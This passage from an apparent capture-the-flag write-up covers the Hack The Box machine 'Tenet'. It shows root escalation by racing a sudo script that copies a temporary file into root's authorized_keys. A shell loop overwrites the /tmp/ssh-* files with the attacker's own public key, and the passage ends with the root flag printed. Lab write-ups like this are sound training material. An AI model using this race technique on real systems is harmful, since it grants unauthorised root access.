+	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+
+		/bin/echo &quot;Successfully added $sshName to authorized_keys file!&quot;
+
+	else
+
+		/bin/echo &quot;Error in adding $sshName to authorized_keys file!&quot;
+
+	fi
+
+}
+
+checkFile() {
+
+	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+
+		/bin/echo &quot;Error in creating key file!&quot;
+
+		if [[ -f $1 ]]; then /bin/rm $1; fi
+
+		exit 1
+
+	fi
+
+}
+
+addKey() {
+
+	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+	(umask 110; touch $tmpName)
+
+	/bin/echo $key &gt;&gt;$tmpName
+
+	checkFile $tmpName
+
+	/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+	/bin/rm $tmpName
+
+}
+
+key=&quot;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&quot;
+addKey
+checkAdded
+neil@tenet:~$ 
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web14.png">
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenet/web15.png">
+</p>
+
+<ul>
+<li>If we look at the script and execute this which stores <code>tmpName</code> it creates a temporary value.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ mktemp -u /tmp/ssh-XXXXXXXX
+/tmp/ssh-ui1c8x0m
+neil@tenet:~$ mktemp -u /tmp/ssh-XXXXXXXX
+/tmp/ssh-KH7vkHSO
+</code></pre></div></div>
+<ul>
+<li>The first thing we are going to do is to create a key pair.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh-keygen -f /root/id_rsa -N &quot;&quot;
+Generating public/private ed25519 key pair.
+Your identification has been saved in /root/id_rsa
+Your public key has been saved in /root/id_rsa.pub
+The key fingerprint is:
+SHA256:LL4/EFhSOqu9HhJp6tvZ64JW0lJtanWVb1PbNdMymQk root@miguelos
+The key's randomart image is:
++--[ED25519 256]--+
+|     ..   . E. +.|
+|    ...  o   .*oo|
+|    ++  . . . oo+|
+|   o.*.o   + . . |
+|  * = o.S . .    |
+| = O ...         |
+|. O o ..         |
+|.o.ooo ..        |
+|.o.+=+o...       |
++----[SHA256]-----+
+</code></pre></div></div>
+<ul>
+<li>Now we copy it.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat id_rsa.pub | tr -d '\n' | xclip -sel clip
+</code></pre></div></div>
+<ul>
+<li>And we run a loop with our public key.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ while true; do for filename in /tmp/ssh-*; do echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEiM/fMXvCoQX988QWZre1S9ZG5Kguv/ root@miguelos&quot; &gt; $filename;done; done
+</code></pre></div></div>
+<ul>
+<li>Now from another window we connect via <strong>SSH</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ ssh neil@10.10.10.223
+The authenticity of host '10.10.10.223 (10.10.10.223)' can't be established.
+ED25519 key fingerprint is SHA256:atDC5N+fRDvKKwKE6Y6GZN4MdRAr5aHD24UsVrZ4+ts.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.223' (ED25519) to the list of known hosts.
+neil@10.10.10.223's password:
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Jul  4 01:04:47 UTC 2024
+
+  System load:  0.95               Processes:             178
+  Usage of /:   15.3% of 22.51GB   Users logged in:       0
+  Memory usage: 11%                IP address for ens160: 10.10.10.223
+  Swap usage:   0%
+
+
+53 packages can be updated.
+31 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
+neil@tenet:~$ export TERM=xterm
+neil@tenet:~$
+</code></pre></div></div>
+<ul>
+<li>And we execute.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
+</code></pre></div></div>
+<h2 id="shell-as-root-and-root-txt">Shell as root and root.txt</h2>
+<ul>
+<li>After several attempts we succeeded login with ssh because it is a <code>race condition</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">root@tenet:~# cat /root/root.txt
+74e3750ae90e0db4c09df869028cabca 
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
